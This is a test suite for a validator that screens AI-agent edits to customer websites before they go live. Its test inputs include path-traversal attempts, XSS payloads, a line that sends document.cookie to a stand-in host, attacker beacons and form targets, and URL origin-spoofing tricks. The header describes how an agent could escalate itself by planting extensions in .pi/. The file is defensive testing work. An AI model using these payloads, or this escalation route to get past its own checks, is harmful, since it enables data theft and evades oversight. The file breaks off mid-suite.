/**
 * validate.ts — der schmale Prüfschritt zwischen Arbeitskopie und Live-Site.
 *
 * Der Validator urteilt **nie** darüber, ob eine Änderung gut ist. Geprüft wird
 * nur, was kein denkbarer Kundenwunsch je erfordern würde. Alles andere gehört
 * in den System-Prompt.
 *
 * Zwei Ausgänge:
 *   { ok: false, grund }    — Datei wird nicht übernommen, der Grund geht als
 *                             deutscher Klartext an den Agenten zurück.
 *   { ok: true, hinweise }  — übernommen; Hinweise sind weiche Rückmeldung.
 *
 * Der wichtigste Test hier ist der auf `.pi/`: Das ist kein Formalismus, sondern
 * der Selbst-Eskalationspfad — `pi` lädt projekt-lokale Extensions aus
 * `.pi/extensions/` und fragt im nicht-interaktiven Betrieb nicht nach. Ein
 * Agent, der sich dort etwas hinlegt, führt beim nächsten Lauf eigenen Code aus.
 */
import { describe, expect, test, afterAll } from "bun:test";
import { mkdtempSync, rmSync, cpSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  MAX_DATEI_BYTES,
  MAX_DATEIEN_JE_LAUF,
  validateAgentOutput,
  leereSiteWissenCache,
  type ValidateKontext,
  type ValidateErgebnis,
} from "./validate.ts";

const REPO_ROOT = join(import.meta.dir, "..");
const REAL_SITE = join(REPO_ROOT, "examples", "site");

const tmpRoots: string[] = [];

function makeSite(): string {
  const dir = mkdtempSync(join(tmpdir(), "regoro-validate-"));
  tmpRoots.push(dir);
  cpSync(REAL_SITE, dir, { recursive: true });
  return dir;
}

afterAll(() => {
  for (const dir of tmpRoots) {
    try {
      rmSync(dir, { recursive: true, force: true });
    } catch {
      /* best effort */
    }
  }
});

/** Eine Site pro Datei reicht — der Validator schreibt nicht, er liest nur CSS und Tokens. */
const SITE = makeSite();

function ktx(over: Partial<ValidateKontext> = {}): ValidateKontext {
  return { siteDir: SITE, browserHerkuenfte: [], anzahlBisher: 0, ...over };
}

function pruefe(
  relPfad: string,
  inhaltNeu: string,
  inhaltAlt: string | null = null,
  over: Partial<ValidateKontext> = {},
): ValidateErgebnis {
  return validateAgentOutput(relPfad, inhaltNeu, inhaltAlt, ktx(over));
}

/** Kurzform: abgelehnt? */
function abgelehnt(e: ValidateErgebnis): boolean {
  return e.ok === false;
}

/** Eine vollständige, harmlose Seite im Stil der Fixture. */
function seite(rumpf: string): string {
  return `<!doctype html>
<html lang="de"><head><meta charset="utf-8"><title>Leistungen</title>
<link rel="stylesheet" href="styles.css"></head>
<body><div class="wrap">${rumpf}</div></body></html>`;
}

// ===========================================================================
// Pfadregeln
// ===========================================================================

describe("validate.ts — Pfade mit führendem Punkt (der Selbst-Eskalationspfad)", () => {
  test(".pi/settings.json wird abgelehnt — pi lädt Extensions von dort ungefragt", () => {
    expect(abgelehnt(pruefe(".pi/settings.json", "{}"))).toBe(true);
  });

  test(".pi/extensions/boese.ts wird abgelehnt", () => {
    expect(abgelehnt(pruefe(".pi/extensions/boese.ts", "export default {}"))).toBe(true);
  });

  test(".regoro/auth.json wird abgelehnt — dort liegt das Sitzungsgeheimnis", () => {
    expect(abgelehnt(pruefe(".regoro/auth.json", "{}"))).toBe(true);
  });

  test(".git/config wird abgelehnt — sonst schreibt der Agent an der Versionsliste vorbei", () => {
    expect(abgelehnt(pruefe(".git/config", "[core]"))).toBe(true);
  });

  test(".gitignore und .htaccess werden abgelehnt (führender Punkt, egal auf welcher Ebene)", () => {
    expect(abgelehnt(pruefe(".gitignore", "x"))).toBe(true);
    expect(abgelehnt(pruefe(".htaccess", "x"))).toBe(true);
  });

  test("ein Punkt-Segment MITTEN im Pfad wird ebenso abgelehnt", () => {
    // Caddys path-Matcher ist Glob, kein Segment-Matcher — deshalb prüft der
    // Dotfile-Block in host.ts jedes Segment. Hier gilt dasselbe.
    expect(abgelehnt(pruefe("assets/.versteckt/x.css", "body{}"))).toBe(true);
    expect(abgelehnt(pruefe("assets/.hero.png", "x"))).toBe(true);
  });

  test("./seite.html wird abgelehnt", () => {
    expect(abgelehnt(pruefe("./seite.html", seite("<p>x</p>")))).toBe(true);
  });
});

describe("validate.ts — Pfade außerhalb des Site-Ordners", () => {
  test("../etc/passwd wird abgelehnt", () => {
    expect(abgelehnt(pruefe("../etc/passwd", "root:x:0:0"))).toBe(true);
  });

  test("tiefes Heraufsteigen wird abgelehnt", () => {
    expect(abgelehnt(pruefe("assets/../../../etc/passwd", "x"))).toBe(true);
  });

  test("absolute Pfade werden abgelehnt", () => {
    expect(abgelehnt(pruefe("/etc/passwd", "x"))).toBe(true);
    expect(abgelehnt(pruefe("/home/agent/.ssh/authorized_keys", "ssh-rsa AAA"))).toBe(true);
  });

  test("der leere Pfad wird abgelehnt", () => {
    expect(abgelehnt(pruefe("", "x"))).toBe(true);
  });

  test("mehr als drei Pfadebenen werden abgelehnt", () => {
    expect(abgelehnt(pruefe("a/b/c/d.js", "1"))).toBe(true);
  });

  test("drei Ebenen sind erlaubt", () => {
    expect(pruefe("assets/js/app.js", "document.title = document.title;").ok).toBe(true);
  });
});

describe("validate.ts — Endungen: nur was Caddy ausliefert", () => {
  test.each([
    ["daten.json", "{}"],
    ["notizen.md", "# x"],
    ["logo.svg", "<svg xmlns='http://www.w3.org/2000/svg'></svg>"],
    ["shell.php", "<?php echo 1; ?>"],
    ["config.yaml", "a: 1"],
    ["dump.sql", "SELECT 1;"],
    ["skript.sh", "#!/bin/sh"],
    ["ohneendung", "x"],
  ])("%s wird abgelehnt", (pfad, inhalt) => {
    expect(abgelehnt(pruefe(pfad, inhalt))).toBe(true);
  });

  test(".svg bleibt draußen, obwohl es ein Bild ist — image/svg+xml ist script-fähig", () => {
    const e = pruefe("assets/logo.svg", "<svg xmlns='http://www.w3.org/2000/svg'><circle r='1'/></svg>");
    expect(abgelehnt(e)).toBe(true);
  });

  test.each([
    ["leistungen.html", "<p>Text</p>"],
    ["assets/extra.css", ".neu{color:var(--ink)}"],
    ["assets/app.js", "document.title = document.title;"],
    ["assets/foto.webp", "RIFF"],
    ["assets/foto.png", "\x89PNG"],
    ["robots.txt", "User-agent: *"],
  ])("%s ist erlaubt", (pfad, inhalt) => {
    const e = pruefe(pfad, pfad.endsWith(".html") ? seite(inhalt) : inhalt);
    expect(e.ok).toBe(true);
  });
});

describe("validate.ts — Seitennamen gegen PAGE_RE", () => {
  test("„Foo Bar.html\" wird abgelehnt — der Editor könnte die Seite später nicht auflösen", () => {
    expect(abgelehnt(pruefe("Foo Bar.html", seite("<p>x</p>")))).toBe(true);
  });

  test("Großbuchstaben und Umlaute im Seitennamen werden abgelehnt", () => {
    expect(abgelehnt(pruefe("Leistungen.html", seite("<p>x</p>")))).toBe(true);
    expect(abgelehnt(pruefe("bad-sanierung-für-alle.html", seite("<p>x</p>")))).toBe(true);
    expect(abgelehnt(pruefe("leistungen.HTML", seite("<p>x</p>")))).toBe(true);
  });

  test("eine Seite im Unterordner wird abgelehnt — sie wäre danach nicht editierbar", () => {
    // resolvePage löst nur flaches <name>.html auf. Eine Seite in einem
    // Unterordner entstünde, wäre verlinkt — und der Kunde käme nie wieder an
    // sie heran. Die Tiefe ≤ 3 gilt Assets, nicht Seiten.
    expect(abgelehnt(pruefe("unterordner/leistungen.html", seite("<h2>x</h2>")))).toBe(true);
    expect(abgelehnt(pruefe("seiten/bad/sanierung.html", seite("<h2>x</h2>")))).toBe(true);
  });

  test("Assets dürfen weiterhin in Unterordnern liegen", () => {
    expect(pruefe("assets/js/app.js", "document.title = document.title;").ok).toBe(true);
    expect(pruefe("assets/bilder/hero.webp", "RIFF").ok).toBe(true);
  });

  test("kleingeschriebene Namen mit Bindestrich sind erlaubt", () => {
    expect(pruefe("bad-sanierung.html", seite("<h2>Bad</h2>")).ok).toBe(true);
    expect(pruefe("index.html", seite("<h2>Start</h2>"), seite("<h2>Alt</h2>")).ok).toBe(true);
  });
});

// ===========================================================================
// Größen und Anzahl — die Notbremse gegen einen entgleisten Lauf
// ===========================================================================

describe("validate.ts — Obergrenzen", () => {
  test("MAX_DATEI_BYTES ist 512 KB, MAX_DATEIEN_JE_LAUF ist 20", () => {
    expect(MAX_DATEI_BYTES).toBe(512 * 1024);
    expect(MAX_DATEIEN_JE_LAUF).toBe(20);
  });

  test("eine Datei über 512 KB wird abgelehnt", () => {
    expect(abgelehnt(pruefe("gross.txt", "a".repeat(MAX_DATEI_BYTES + 1)))).toBe(true);
  });

  test("genau 512 KB ist noch erlaubt", () => {
    expect(pruefe("gross.txt", "a".repeat(MAX_DATEI_BYTES)).ok).toBe(true);
  });

  test("die Grenze zählt Bytes, nicht Zeichen — Umlaute sind zwei Bytes", () => {
    // "ä" ist in UTF-8 zwei Bytes. Wer .length nimmt, lässt die doppelte Menge durch.
    expect(abgelehnt(pruefe("gross.txt", "ä".repeat(MAX_DATEI_BYTES / 2 + 1)))).toBe(true);
  });

  test("die 21. Datei eines Laufs wird abgelehnt", () => {
    expect(abgelehnt(pruefe("noch-eine.html", seite("<p>x</p>"), null, { anzahlBisher: MAX_DATEIEN_JE_LAUF }))).toBe(
      true,
    );
  });

  test("die 20. Datei geht noch durch", () => {
    expect(pruefe("nummer-20.html", seite("<p>x</p>"), null, { anzahlBisher: MAX_DATEIEN_JE_LAUF - 1 }).ok).toBe(true);
  });
});

// ===========================================================================
// Skripte: ein Vergleich, kein Urteil
// ===========================================================================

describe("validate.ts — neue Inline-Skripte und Ereignis-Attribute", () => {
  test("ein neuer <script>…</script>-Block wird abgelehnt", () => {
    const e = pruefe("leistungen.html", seite("<p>x</p><script>alert(1)</script>"));
    expect(abgelehnt(e)).toBe(true);
  });

  test("ein neues onclick= wird abgelehnt", () => {
    expect(abgelehnt(pruefe("leistungen.html", seite('<button onclick="alert(1)">Los</button>')))).toBe(true);
  });

  test("auch andere on*-Attribute werden abgelehnt", () => {
    expect(abgelehnt(pruefe("leistungen.html", seite('<img src="assets/hero.png" onerror="alert(1)">')))).toBe(true);
    expect(abgelehnt(pruefe("leistungen.html", seite('<body onload="x()"><p>y</p>')))).toBe(true);
    expect(abgelehnt(pruefe("leistungen.html", seite('<div onmouseover = "x()">y</div>')))).toBe(true);
  });

  test("javascript:-URLs werden abgelehnt", () => {
    expect(abgelehnt(pruefe("leistungen.html", seite('<a href="javascript:alert(1)">Los</a>')))).toBe(true);
  });

  test("<iframe> wird abgelehnt", () => {
    expect(abgelehnt(pruefe("leistungen.html", seite('<iframe src="/index.html"></iframe>')))).toBe(true);
  });

  test("ein <script ohne schließendes > wird abgelehnt — linkedom reicht es als Text durch", () => {
    // Genau deshalb steht die Rohtext-Vorprüfung VOR dem Parsen: der Parser sieht
    // hier nichts, der Browser führt es trotzdem aus.
    expect(abgelehnt(pruefe("leistungen.html", seite('<p>x</p><script src="https://fremd.de/x.js"')))).toBe(true);
    expect(abgelehnt(pruefe("leistungen.html", seite("<p>x</p><script")))).toBe(true);
  });

  test("ein UNVERÄNDERTER Inline-Block aus der Fabrik bleibt erlaubt", () => {
    // Die Regel ist ein Vergleich, kein Urteil: Die Menge der Inline-Blöcke vor
    // und nach dem Lauf muss gleich bleiben. Ein pauschales Verbot von "<script"
    // machte jede echte Kundenseite unbearbeitbar — sie enthält acht davon,
    // sieben inline (SiteHeader gegen Layout-Sprung, JSON-LD).
    const fabrikSkript = `<script>document.documentElement.classList.add("js")</script>`;
    const alt = seite(`<h2>Leistungen</h2>${fabrikSkript}`);
    const neu = seite(`<h2>Leistungen</h2><p>Neuer Absatz.</p>${fabrikSkript}`);
    const e = pruefe("index.html", neu, alt);
    expect(e.ok).toBe(true);
  });

  test("ein GEÄNDERTER Inline-Block wird abgelehnt", () => {
    const alt = seite(`<script>a()</script>`);
    const neu = seite(`<script>a();fetch("https://fremd.de/?c="+document.cookie)</script>`);
    expect(abgelehnt(pruefe("index.html", neu, alt))).toBe(true);
  });

  test("ein zusätzlicher Block neben dem unveränderten wird abgelehnt", () => {
    const alt = seite(`<script>a()</script>`);
    const neu = seite(`<script>a()</script><script>b()</script>`);
    expect(abgelehnt(pruefe("index.html", neu, alt))).toBe(true);
  });

  test("bei einer NEUEN Datei ist jeder Inline-Block neu", () => {
    expect(abgelehnt(pruefe("neu.html", seite("<script>a()</script>"), null))).toBe(true);
  });

  test('<script src="/assets/app.js"> ist erlaubt — eigener Ursprung, eigene Datei', () => {
    const e = pruefe("leistungen.html", seite('<h2>x</h2><script src="/assets/app.js"></script>'));
    expect(e.ok).toBe(true);
  });

  test("ein Inline-Block darf auch verschwinden", () => {
    const alt = seite(`<p>x</p><script>a()</script>`);
    expect(pruefe("index.html", seite("<p>x</p>"), alt).ok).toBe(true);
  });
});

describe("validate.ts — die Rohtext-Vorprüfung darf keine harmlosen Texte fressen", () => {
  test("ein Link mit Query, in dem zufällig „on…=\" steckt, bleibt erlaubt", () => {
    // Ein blindes /on\w+\s*=/ über den ganzen Rohtext trifft "aktion_id=3" und
    // damit jede zweite echte Seite. Die Regel gilt Attributnamen, nicht Fließtext.
    const e = pruefe("leistungen.html", seite('<a href="/kontakt.html?aktion_id=3">Kontakt</a>'));
    expect(e.ok).toBe(true);
  });

  test("Fließtext über Aktionen und Monitore bleibt erlaubt", () => {
    const e = pruefe("leistungen.html", seite("<p>Unser Monitor=Test lief sauber. Aktion_neu=gestartet.</p>"));
    expect(e.ok).toBe(true);
  });
});

// ===========================================================================
// Fremde Herkünfte
// ===========================================================================

describe("validate.ts — externe Ressourcen werden abgelehnt", () => {
  test("<link href> auf eine fremde Herkunft", () => {
    expect(abgelehnt(pruefe("index.html", seite('<link rel="stylesheet" href="https://fremd.de/x.css">')))).toBe(true);
  });

  test("<img src> protokollrelativ ist extern", () => {
    expect(abgelehnt(pruefe("index.html", seite('<img src="//fremd.de/y.png" alt="">')))).toBe(true);
  });

  test("<script src> auf eine fremde Herkunft", () => {
    expect(abgelehnt(pruefe("index.html", seite('<script src="https://fremd.de/x.js"></script>')))).toBe(true);
  });

  test("@import im CSS auf eine fremde Herkunft", () => {
    expect(abgelehnt(pruefe("assets/extra.css", '@import url(https://fremd.de/z.css);\n.a{color:var(--ink)}'))).toBe(
      true,
    );
  });

  test("url() im CSS auf eine fremde Herkunft", () => {
    expect(abgelehnt(pruefe("assets/extra.css", ".a{background:url(https://fremd.de/bg.png)}"))).toBe(true);
  });

  test("url() mit Anführungszeichen und Leerraum wird ebenso gefunden", () => {
    expect(abgelehnt(pruefe("assets/extra.css", ".a{background:url( \"https://fremd.de/bg.png\" )}"))).toBe(true);
    expect(abgelehnt(pruefe("assets/extra.css", ".a{background:url('//fremd.de/bg.png')}"))).toBe(true);
  });

  test("eine fremde Schriftart per @font-face wird abgelehnt — die Fabrik hostet Schriften selbst", () => {
    const css = `@font-face{font-family:X;src:url(https://fonts.gstatic.com/s/x.woff2) format("woff2")}`;
    expect(abgelehnt(pruefe("assets/extra.css", css))).toBe(true);
  });

  test("HTML-Entitäten im Attribut helfen nicht — geprüft wird der geparste Wert", () => {
    expect(abgelehnt(pruefe("index.html", seite('<img src="&#104;ttps://fremd.de/x.png" alt="">')))).toBe(true);
  });

  test("Zeilenumbrüche in der URL helfen nicht — der Browser entfernt sie beim Laden", () => {
    expect(abgelehnt(pruefe("index.html", seite('<img src="https://fre\nmd.de/x.png" alt="">')))).toBe(true);
  });
});

describe("validate.ts — eigene Herkunft bleibt erlaubt", () => {
  test.each([
    '<a href="/kontakt.html">Kontakt</a>',
    '<a href="kontakt.html">Kontakt</a>',
    '<img src="assets/x.webp" alt="">',
    '<img src="/assets/x.webp" alt="">',
    '<link rel="stylesheet" href="styles.css">',
    '<a href="#kontakt">runter</a>',
    '<a href="mailto:info@example.de">Mail</a>',
    '<a href="tel:+4915120464812">Anruf</a>',
  ])("%s ist erlaubt", (rumpf) => {
    expect(pruefe("leistungen.html", seite(rumpf)).ok).toBe(true);
  });

  test('ein <a href> auf eine fremde Website ist erlaubt — ein Link lädt nichts', () => {
    // Verlinken ist ein alltäglicher Kundenwunsch („verlink unsere Innung").
    // Geladen wird dabei nichts; die Grenze gegen stillen Abfluss ist die CSP
    // (connect-src 'none', img-src 'self', form-action 'self'), nicht das Verbot
    // von Hyperlinks.
    const e = pruefe("leistungen.html", seite('<a href="https://www.innung-shk.de/" rel="noopener">Innung</a>'));
    expect(e.ok).toBe(true);
  });

  test("data:-Bilder sind erlaubt (img-src 'self' data: in der CSP)", () => {
    const px = "data:image/png;base64,iVBORw0KGgo=";
    expect(pruefe("leistungen.html", seite(`<img src="${px}" alt="">`)).ok).toBe(true);
  });
});

describe("validate.ts — browserHerkuenfte sind die einzige Ausnahme, und sie wird EXAKT verglichen", () => {
  const erlaubt = { browserHerkuenfte: ["https://js.stripe.com"] };

  test("die freigeschaltete Herkunft wird durchgelassen", () => {
    const e = pruefe("index.html", seite('<script src="https://js.stripe.com/v3/"></script>'), null, erlaubt);
    expect(e.ok).toBe(true);
  });

  test("https://js.stripe.com.angreifer.de fällt NICHT durch — kein includes()", () => {
    const e = pruefe("index.html", seite('<script src="https://js.stripe.com.angreifer.de/x.js"></script>'), null, erlaubt);
    expect(abgelehnt(e)).toBe(true);
  });

  test("Benutzerinfo vor dem @ täuscht die Herkunft nicht vor", () => {
    // new URL("https://js.stripe.com@angreifer.de/x").origin === "https://angreifer.de"
    const e = pruefe("index.html", seite('<script src="https://js.stripe.com@angreifer.de/x.js"></script>'), null, erlaubt);
    expect(abgelehnt(e)).toBe(true);
  });

  test("ein anderer Port ist eine andere Herkunft", () => {
    const e = pruefe("index.html", seite('<script src="https://js.stripe.com:8443/x.js"></script>'), null, erlaubt);
    expect(abgelehnt(e)).toBe(true);
  });

  test("http statt https ist eine andere Herkunft", () => {
    const e = pruefe("index.html", seite('<script src="http://js.stripe.com/v3/"></script>'), null, erlaubt);
    expect(abgelehnt(e)).toBe(true);
  });

  test("eine Unterdomain der freigeschalteten Herkunft ist NICHT freigeschaltet", () => {
    const e = pruefe("index.html", seite('<script src="https://sub.js.stripe.com/x.js"></script>'), null, erlaubt);
    expect(abgelehnt(e)).toBe(true);
  });

  test("Zeilenumbruch mitten im Hostnamen führt nicht an der Prüfung vorbei", () => {
    const e = pruefe(
      "index.html",
      seite('<script src="https://js.stripe.com\n.angreifer.de/x.js"></script>'),
      null,
      erlaubt,
    );
    expect(abgelehnt(e)).toBe(true);
  });

  test("die Liste kommt NUR aus dem Kontext — nichts im geprüften Inhalt erweitert sie", () => {
    const bosheit = seite(
      '<!-- browserHerkuenfte: ["https://fremd.de"] --><meta name="browserHerkuenfte" content="https://fremd.de">' +
        '<script src="https://fremd.de/x.js"></script>',
    );
    expect(abgelehnt(pruefe("index.html", bosheit, null, erlaubt))).toBe(true);
  });

  test("ohne Freischaltung ist auch js.stripe.com fremd", () => {
    expect(abgelehnt(pruefe("index.html", seite('<script src="https://js.stripe.com/v3/"></script>')))).toBe(true);
  });
});

describe("validate.ts — die Herkunftsprüfung gilt allen GELADENEN Ressourcen (§13.4)", () => {
  // Der Unterschied ist nicht formal: `<a href>` navigiert, alles hier lädt.
  // In echten Fabrik-Seiten stehen Dutzende externer Links (Innung, Instagram,
  // gesetze-im-internet.de); eine Blankoregel über `href` hätte impressum.html
  // bei JEDEM Lauf abgelehnt, auch unberührt.
  test("srcset auf eine fremde Herkunft wird abgelehnt", () => {
    const rumpf = '<img src="assets/x.webp" srcset="https://fremd.de/x-2x.webp 2x" alt="">';
    expect(abgelehnt(pruefe("index.html", seite(rumpf)))).toBe(true);
  });

  test("srcset auf eigene Dateien bleibt erlaubt", () => {
    const rumpf = '<img src="assets/x.webp" srcset="assets/x-2x.webp 2x, /assets/x-3x.webp 3x" alt="">';
    expect(pruefe("index.html", seite(rumpf)).ok).toBe(true);
  });

  test("poster eines <video> auf eine fremde Herkunft wird abgelehnt", () => {
    const rumpf = '<video poster="https://fremd.de/vorschau.jpg" src="assets/film.webm"></video>';
    expect(abgelehnt(pruefe("index.html", seite(rumpf)))).toBe(true);
  });

  test("ein Formular auf ein fremdes Ziel wird abgelehnt", () => {
    // form-action 'self' in der CSP würde es ohnehin blockieren — dann stünde
    // ein totes Kontaktformular auf der Kundenseite.
    const rumpf = '<form action="https://fremd.de/sammeln" method="post"><input name="mail"></form>';
    expect(abgelehnt(pruefe("kontakt.html", seite(rumpf)))).toBe(true);
  });

  test("ein Formular auf das eigene Ziel bleibt erlaubt", () => {
    const rumpf = '<form action="/kontakt.html" method="post"><input name="mail"></form>';
    expect(pruefe("kontakt.html", seite(rumpf)).ok).toBe(true);
  });
});

describe("validate.ts — data: reicht genau so weit wie die CSP (§13.4)", () => {
  const px = "data:image/png;base64,iVBORw0KGgo=";

  test("als <img src> erlaubt — img-src 'self' data:", () => {
    expect(pruefe("index.html", seite(`<img src="${px}" alt="">`)).ok).toBe(true);
  });

  test("als Stylesheet abgelehnt — style-src kennt kein data:", () => {
    const rumpf = '<link rel="stylesheet" href="data:text/css,body%7Bcolor:red%7D">';
    expect(abgelehnt(pruefe("index.html", seite(rumpf)))).toBe(true);
  });

  test("als Skriptquelle abgelehnt", () => {
    const rumpf = '<script src="data:text/javascript,alert(1)"></script>';
    expect(abgelehnt(pruefe("index.html", seite(rumpf)))).toBe(true);
  });

  test("als iframe-Quelle abgelehnt", () => {
    expect(abgelehnt(pruefe("index.html", seite('<iframe src="data:text/html,<b>x</b>"></iframe>')))).toBe(true);
  });
});

// ===========================================================================
// §13.26 — jedes absolute Verbot ist ein Vergleich, sobald es einen Vorzustand gibt
// ===========================================================================

describe("validate.ts — bei inhaltAlt !== null wird gegen den Vorzustand verglichen", () => {
  // Der Validator beurteilt, was der AGENT getan hat, nicht was die Fabrik
  // ausgeliefert hat. Geprüft werden ganze Dateien, nicht Diffs — ohne diesen
  // Vergleich lehnte er eine unberührte Fabrik-Seite bei JEDEM Lauf ab und der
  // Kunde könnte genau die Seiten nicht ändern, die er wirklich hat.

  const FREMDES_BILD = '<img src="https://fremd.de/partner-logo.png" alt="Partner">';
  const RAHMEN = '<iframe src="https://www.openstreetmap.org/export/embed.html" title="Karte"></iframe>';
  const FORMULAR = '<form action="https://formulare.example/senden" method="post"><input name="mail"></form>';
  const KNOPF = '<button onclick="druckeSeite()">Drucken</button>';

  test.each([
    ["ein <iframe> aus der Fabrik", RAHMEN],
    ["eine fremde geladene Ressource", FREMDES_BILD],
    ["ein Formular auf ein fremdes Ziel", FORMULAR],
    ["ein on*-Attribut", KNOPF],
  ])("%s passiert UNVERÄNDERT", (_name, stueck) => {
    const alt = seite(`<h2>Kontakt</h2>${stueck}`);
    const neu = seite(`<h2>Kontakt</h2><p>Neuer Absatz vom Agenten.</p>${stueck}`);
    expect(pruefe("kontakt.html", neu, alt).ok).toBe(true);
  });

  test.each([
    ["ein NEUES <iframe>", RAHMEN],
    ["eine NEUE fremde geladene Ressource", FREMDES_BILD],
    ["ein NEUES Formular auf ein fremdes Ziel", FORMULAR],
    ["ein NEUES on*-Attribut", KNOPF],
  ])("%s wird abgelehnt", (_name, stueck) => {
    const alt = seite("<h2>Kontakt</h2>");
    const neu = seite(`<h2>Kontakt</h2>${stueck}`);
    expect(abgelehnt(pruefe("kontakt.html", neu, alt))).toBe(true);
  });

  test("ein ZWEITES neben dem alten wird abgelehnt — der Vorzustand ist kein Freibrief", () => {
    // „Es gab schon ein iframe, also sind iframes hier erlaubt" wäre die
    // gefährliche Auslegung: Eine Seite mit einem Fabrik-Rahmen würde damit zur
    // offenen Tür für beliebige weitere.
    for (const [stueck, zusatz] of [
      [RAHMEN, '<iframe src="https://angreifer.de/x.html"></iframe>'],
      [FREMDES_BILD, '<img src="https://angreifer.de/beacon.png" alt="">'],
      [FORMULAR, '<form action="https://angreifer.de/sammeln"><input name="x"></form>'],
      [KNOPF, '<button onclick="fetch(\'https://angreifer.de\')">Los</button>'],
    ] as const) {
      const alt = seite(`<h2>Kontakt</h2>${stueck}`);
      const neu = seite(`<h2>Kontakt</h2>${stueck}${zusatz}`);
      expect(abgelehnt(pruefe("kontakt.html", neu, alt))).toBe(true);
    }
  });

  test("ein VERÄNDERTES Stück wird abgelehnt, auch wenn die Anzahl gleich bleibt", () => {
    const alt = seite(`<h2>Kontakt</h2>${FREMDES_BILD}`);
    const neu = seite('<h2>Kontakt</h2><img src="https://angreifer.de/beacon.png" alt="Partner">');
    expect(abgelehnt(pruefe("kontakt.html", neu, alt))).toBe(true);
  });

  test("Entfernen ist immer erlaubt — der Agent darf aufräumen", () => {
    const alt = seite(`<h2>Kontakt</h2>${RAHMEN}${FREMDES_BILD}${FORMULAR}${KNOPF}`);
    expect(pruefe("kontakt.html", seite("<h2>Kontakt</h2>"), alt).ok).toBe(true);
  });

  test("bei einer NEUEN Datei gilt volle Strenge — es gibt keinen Vorzustand", () => {
    for (const stueck of [RAHMEN, FREMDES_BILD, FORMULAR, KNOPF]) {
      expect(abgelehnt(pruefe("neue-seite.html", seite(`<h2>x</h2>${stueck}`), null))).toBe(true);
    }
  });

  test("der Vorzustand einer ANDEREN Datei zählt nicht", () => {
    // inhaltAlt ist der Vorzustand GENAU DIESER Datei. Wer versehentlich eine
    // andere heranzieht, macht aus einer Fabrik-Ausnahme eine site-weite.
    const altMitRahmen = seite(`<h2>Start</h2>${RAHMEN}`);
    expect(pruefe("index.html", seite(`<h2>Start</h2>${RAHMEN}`), altMitRahmen).ok).toBe(true);
    expect(abgelehnt(pruefe("kontakt.html", seite(`<h2>Kontakt</h2>${RAHMEN}`), seite("<h2>Kontakt</h2>")))).toBe(true);
  });
});

// ===========================================================================
// JavaScript in eigenen Dateien
// ===========================================================================

describe("validate.ts — JavaScript gehört in eine eigene .js-Datei", () => {
  test("eine neue assets/app.js wird angenommen", () => {
    const js = `document.addEventListener("DOMContentLoaded", () => {
  for (const el of document.querySelectorAll(".btn")) el.classList.add("bereit");
});`;
    expect(pruefe("assets/app.js", js).ok).toBe(true);
  });

  test("gewöhnliches JavaScript wird nicht von den HTML-Regeln erschlagen", () => {
    // Die Rohtext-Vorprüfung ist gegen geschmuggeltes Markup gerichtet. Auf eine
    // .js-Datei angewandt verbietet sie ordinäres JavaScript — und damit genau
    // das, was der Plan ausdrücklich erlaubt.
    const js = `const b = document.querySelector("#los");
b.onclick = () => { b.textContent = "läuft"; };
document.body.insertAdjacentHTML("beforeend", "<p>fertig</p>");`;
    expect(pruefe("assets/app.js", js).ok).toBe(true);
  });
});

// ===========================================================================
// Annehmen: der Alltag
// ===========================================================================

describe("validate.ts — gewöhnliche Änderungen werden angenommen", () => {
  test("eine neue Sektion mit Überschrift und Absätzen", () => {
    const e = pruefe(
      "leistungen.html",
      seite(`<section class="wrap"><h2>Unsere Leistungen</h2><p>Wir sanieren Bäder.</p></section>`),
    );
    expect(e.ok).toBe(true);
    if (e.ok) expect(e.hinweise).toEqual([]);
  });

  test("eine Liste", () => {
    const e = pruefe("leistungen.html", seite("<ul><li>Bad</li><li>Heizung</li><li>Notdienst</li></ul>"));
    expect(e.ok).toBe(true);
  });

  test("eine Tabelle", () => {
    const e = pruefe(
      "preise.html",
      seite("<table><thead><tr><th>Leistung</th><th>Preis</th></tr></thead><tbody><tr><td>Bad</td><td>ab 9.000 €</td></tr></tbody></table>"),
    );
    expect(e.ok).toBe(true);
  });

  test("eine geänderte bestehende Seite", () => {
    const alt = seite("<h1>Alt</h1><p>Alter Text.</p>");
    const neu = seite("<h1>Neu</h1><p>Neuer Text.</p><p>Und noch einer.</p>");
    expect(pruefe("index.html", neu, alt).ok).toBe(true);
  });

  test("bekannte Klassen aus dem vorhandenen CSS lösen keinen Hinweis aus", () => {
    const e = pruefe("leistungen.html", seite('<div class="wrap"><a class="btn" href="/kontakt.html">Anfragen</a></div>'));
    expect(e.ok).toBe(true);
    if (e.ok) expect(e.hinweise).toEqual([]);
  });
});

// ===========================================================================
// Weiche Hinweise — blockieren nicht
// ===========================================================================

describe("validate.ts — weiche Hinweise", () => {
  test("eine erfundene CSS-Klasse blockiert nicht, wird aber gemeldet", () => {
    const e = pruefe("leistungen.html", seite('<a class="btn-primary-neu" href="/kontakt.html">Los</a>'));
    expect(e.ok).toBe(true);
    if (e.ok) {
      expect(e.hinweise.length).toBeGreaterThan(0);
      expect(e.hinweise.join(" ")).toContain("btn-primary-neu");
    }
  });

  test("eine hartkodierte Farbe außerhalb der Design-Tokens wird gemeldet", () => {
    const e = pruefe("leistungen.html", seite('<p style="color:#ff0000">Achtung</p>'));
    expect(e.ok).toBe(true);
    if (e.ok) {
      expect(e.hinweise.length).toBeGreaterThan(0);
      expect(e.hinweise.join(" ")).toContain("#ff0000");
    }
  });

  test("eine Farbe AUS den Tokens der Seite wird nicht gemeldet", () => {
    // examples/site/styles.css: :root { --accent:#e2571e; --ink:#16222e; }
    const e = pruefe("leistungen.html", seite('<p style="color:#e2571e">Akzent</p>'));
    expect(e.ok).toBe(true);
    if (e.ok) expect(e.hinweise.join(" ")).not.toContain("#e2571e");
  });

  test("var(--accent) löst keinen Farb-Hinweis aus", () => {
    const e = pruefe("assets/extra.css", ".neu{color:var(--accent);background:var(--ink)}");
    expect(e.ok).toBe(true);
    if (e.ok) expect(e.hinweise).toEqual([]);
  });

  test("mehrere Hinweise kommen einzeln, nicht als ein Klumpen", () => {
    const e = pruefe(
      "leistungen.html",
      seite('<div class="erfunden-eins"><p class="erfunden-zwei" style="color:#00ff00">x</p></div>'),
    );
    expect(e.ok).toBe(true);
    if (e.ok) expect(e.hinweise.length).toBeGreaterThanOrEqual(2);
  });
});

describe("validate.ts — das Wissen über eine Website gehört genau dieser Website", () => {
  // Die weichen Hinweise stammen aus dem CSS der Site. Wird dieses Wissen
  // zwischen Sites verwechselt, schweigt der Validator bei Kunde B über eine
  // erfundene Klasse, nur weil Kunde A sie hat — im Sammelbetrieb läuft EIN
  // Prozess für alle (Invariante 10).

